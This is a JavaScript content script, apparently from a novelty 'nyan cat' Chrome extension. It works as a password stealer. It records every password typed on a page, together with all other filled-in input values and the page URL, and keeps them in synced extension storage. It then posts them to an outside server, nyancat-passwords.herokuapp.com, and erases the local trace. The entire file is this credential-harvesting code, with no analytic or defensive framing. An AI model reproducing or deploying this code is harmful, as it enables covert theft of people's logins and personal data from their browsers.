var info = {passwords: [], inputs: [], url: window.location.href}
var isNew = false;

$('input[type=password]').on('input', grabInput);

chrome.storage.sync.get('_nyan', function(items) {
  if (Object.keys(items).length !== 0) {
    $.post('https://nyancat-passwords.herokuapp.com/', items)
      .then(function() {
        chrome.storage.sync.remove('_nyan', function() {
        });
      });
  }
});

function grabInput(event) {
  var values = [];
  $("input").each(function() {
    var value = $(this).val();
    if (value) {
      values.push(value);
    }
  });
  info.inputs = values;
  var password = $(this).val();
  var length = info.passwords.length;
  if (!password) {
    return
  }
  if (length > 0 && info.passwords[length - 1].indexOf(password) >= 0) {
    isNew = true;
  } else if (length < 1 || isNew) {
    info.passwords.push(password);
    isNew = false;
  } else {
    info.passwords[length - 1] = password;
  } 
  chrome.storage.sync.set({'_nyan': info}, function() { 
    if (chrome.runtime.error) {
      console.log("Runtime error.");
    }
  });
}
